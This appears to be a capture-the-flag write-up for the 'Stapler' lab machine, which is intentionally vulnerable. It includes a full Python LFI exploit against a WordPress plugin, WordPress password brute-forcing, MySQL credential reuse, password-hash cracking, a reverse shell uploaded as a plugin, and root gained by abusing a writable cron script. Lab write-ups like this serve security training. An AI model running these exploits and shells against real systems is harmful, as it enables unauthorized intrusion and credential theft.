---
title: "Proving grounds Play: Stapler"
layout: post
date: 2023-10-02 02:00
tag: 
- CTF
- Offsec labs
- OSCP
- Writeup
- Linux
- Pg-Play
- Wordpress
- LFI
writeups: true
hidden: true
author: Naveen
description: "Offsec proving grounds play linux machine writeup"
---

## Nmap

```sh
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open  tcpwrapped
80/tcp    open  http        PHP cli server 5.5 or later
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: 404 Not Found
139/tcp   open  netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open  doom?
3306/tcp  open  mysql       MySQL 5.7.12-0ubuntu1
| mysql-info: 
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 9
|   Capabilities flags: 63487
|   Some Capabilities: Support41Auth, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolOld, LongColumnFlag, ConnectWithDatabase, InteractiveClient, SupportsLoadDataLocal, SupportsCompression, ODBCClient, FoundRows, LongPassword, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
12380/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Tim, we need to-do better next year for Initech
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

## 21/tcp - open  ftp - vsftpd 2.0.8 or later

```text
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             107 Jun 03  2016 note
```

Nothing but a note.

## 80/tcp - open  http - PHP cli server 5.5 or later

```text
[21:55:29] 200 -  220B  - /.bash_logout
[21:55:29] 200 -    4KB - /.bashrc
[21:55:43] 200 -  675B  - /.profile
```

Nothing but few files.

## 139/tcp - open - netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)

```sh
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	kathy           Disk      Fred, What are we doing here?
	tmp             Disk      All temporary files should be stored here
	IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
```

SMB shares.

## 12380/tcp - open  http - Apache httpd 2.4.18 ((Ubuntu))

HTTP - http://192.168.211.148:12380/
HTTPS - https://192.168.211.148:12380/

### HTTP: http://192.168.211.148:12380/

No directories, anything.

### HTTPS - https://192.168.211.148:12380/

https://192.168.211.148:12380/robots.txt

```text
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
```

**Wordpress:** https://192.168.211.148:12380/blogblog/

## WPScan

Perform wpscan to enumerate themes, plugins and users.

```sh
wpscan --url <URL> --enumerate p --enumerate t --enumerate u
```

## Brute Force wordpress credentials

```sh
wpscan --url https://192.168.211.148:12380/blogblog/ --disable-tls-checks -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt
```

```text
garry:footbal
harry:monkey
scott:cookie  
```

Unfortunately none of the above users are administrators, we need admin account to get initial foothold.

## More Recon

https://192.168.208.148:12380/blogblog/wp-content/

![img](/assets/images/CTF/Proving_Grounds/Stapler/content.png)

The plugin advanced-video-embed is vulnerable to [WordPress Plugin Advanced Video 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/39646).

### Exploitation

Use the below exploit code, the one in the above throws ssl error due to the target website configuration.

```py
#!/usr/bin/env python

# Exploit Title: Advanced-Video-Embed Arbitrary File Download / Unauthenticated Post Creation
# Google Dork: N/A
# Date: 04/01/2016
# Exploit Author: evait security GmbH
# Vendor Homepage: arshmultani - http://dscom.it/
# Software Link: https://wordpress.org/plugins/advanced-video-embed-embed-videos-or-playlists/
# Version: 1.0
# Tested on: Linux Apache / Wordpress 4.2.2

# POC - http://127.0.0.1/wordpress/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=[FILEPATH]

# Exploit - Print the content of wp-config.php in terminal (default Wordpress config)

import random
import urllib2
import re
import ssl

ssl._create_default_https_context = ssl._create_unverified_context
url = "https://192.168.211.148:12380/blogblog" # insert url to wordpress

randomID = long(random.random() * 100000000000000000L)

objHtml = urllib2.urlopen(url + '/wp-admin/admin-ajax.php?action=ave_publishPost&title=' + str(randomID) + '&short=rnd&term=rnd&thumb=../wp-config.php')
content =  objHtml.readlines()
for line in content:
	numbers = re.findall(r'\d+',line)
	id = numbers[-1]
	id = int(id) / 10

objHtml = urllib2.urlopen(url + '/?p=' + str(id))
content = objHtml.readlines()

for line in content:
	if 'attachment-post-thumbnail size-post-thumbnail wp-post-image' in line:
		urls=re.findall('"(https?://.*?)"', line)
		print urllib2.urlopen(urls[0]).read()
```

Add the url as per the target page and run the python code. Upon successfull running of the exploit direct to [https://192.168.208.148:12380/blogblog/wp-content/uploads/](https://192.168.208.148:12380/blogblog/wp-content/uploads/) URL and find there is a image file located.

Download the image and use grep to search for string `password`. The exploit extracts the `wp-config.php` file contents as images file.

```text
define('DB_USER', 'root');
define('DB_PASSWORD', 'plbkac')
```

Login to sql server using the credentials and extract wordpress username and hash of an administrative user.

## 3306/tcp - open  mysql - MySQL 5.7.12-0ubuntu1

Login the to sql server using the above extracted credentials.

```sh
naveenj@hackerspace:|01:27|~/proving_grounds/Stapler/files/img$ mysql -u root -pplbkac -h 192.168.208.148
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 9
Server version: 5.7.12-0ubuntu1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| loot               |
| mysql              |
| performance_schema |
| phpmyadmin         |
| proof              |
| sys                |
| wordpress          |
+--------------------+
8 rows in set (0.226 sec)

MySQL [(none)]> use wordpress
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [wordpress]> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.199 sec)

MySQL [wordpress]> select * from wp_users;
16 rows in set (0.192 sec)

MySQL [wordpress]> 
```

Extract the hash of the user `john:$P$B7889EMq/erHIuZapMB8GEizebcIy9.` who is a administrative user.

Use john to crack the hash.

```sh
naveenj@hackerspace:|23:22|~/proving_grounds/Stapler/files$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
incorrect        (?)     
1g 0:00:00:09 DONE (2023-10-01 23:22) 0.1028g/s 19022p/s 19022c/s 19022C/s ireland4..iloveaj2
Use the "--show --format=phpass" options to display all of the cracked passwords reliably
Session completed.
```

Now login to worpress https://192.168.208.148:12380/blogblog/wp-login.php using credentials `john:incorrect`.

Direct to Plugins ➡️ Add New ➡️ Upload Plugin .

Download pentest monkey PHP reverse shell and make changes accordingly and select the file to upload and Click Install Now.

![img](/assets/images/CTF/Proving_Grounds/Stapler/upload.png)

Once it's uploaded direct to https://192.168.208.148:12380/blogblog/wp-content/uploads/ and trigger the reverse shell.

```sh
naveenj@hackerspace:|01:34|~/proving_grounds/Stapler$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.45.193] from (UNKNOWN) [192.168.208.148] 51462
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 athlon i686 GNU/Linux
 06:34:44 up 32 min,  0 users,  load average: 0.00, 0.01, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1408): Inappropriate ioctl for device
bash: no job control in this shell
www-data@red:/$ 
```

**Initial Foothold Obtained**

## Privilege Escalation

### Cronjobs

Check all cronjobs in the machine.

```sh
www-data@red:/$ ls -lsaht /etc/cron.*
ls -lsaht /etc/cron.*
/etc/cron.d:
total 32K
 12K drwxr-xr-x 100 root root  12K Jun  9  2021 ..
4.0K drwxr-xr-x   2 root root 4.0K Jun  3  2016 .
4.0K -rw-r--r--   1 root root   56 Jun  3  2016 logrotate
4.0K -rw-r--r--   1 root root  102 Jun  3  2016 .placeholder
4.0K -rw-r--r--   1 root root  670 Mar  1  2016 php
4.0K -rw-r--r--   1 root root  589 Jul 16  2014 mdadm
```

Contents of `logrotate` file.

```sh
www-data@red:/etc/cron.d$ cat logrotate
cat logrotate
*/5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
www-data@red:/etc/cron.d$ ls -al /usr/local/sbin/cron-logrotate.sh
ls -al /usr/local/sbin/cron-logrotate.sh
-rwxrwxrwx 1 root root 51 Jun  3  2016 /usr/local/sbin/cron-logrotate.sh
www-data@red:/etc/cron.d$ 
```

And the file permission says we can write to it. Write the below exploit to the `cron-logrotate.sh`.

```sh
www-data@red:/usr/local/sbin$ echo "cp /bin/dash /tmp/dash; chmod u+s /tmp/dash;" > /usr/local/sbin/cron-logrotate.sh
</dash; chmod u+s /tmp/dash;" > /usr/local/sbin/cron-logrotate.sh 
```

So when the cron job run the script as root user the binry `dash` will be copied to the `/tmp` folder and `u+s` permissions are applied. So then we can run the binary as the owner which is root and that will give us root shell.

```sh
www-data@red:/tmp$ ls -al
-rwsr-xr-x  1 root root 173644 Oct  2 06:40 dash
```

The exploit worked and run the binary as follows to obtain root.

```sh
www-data@red:/tmp$ ./dash -p
./dash -p
whoami
root
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
python3 -c 'import pty; pty.spawn("/bin/bash")'
bash-4.3$ 
```

**Root Obtained**

Thanks for reading!

For more insights and updates, follow me on Twitter: [@thevillagehacker](https://twitter.com/thevillagehackr).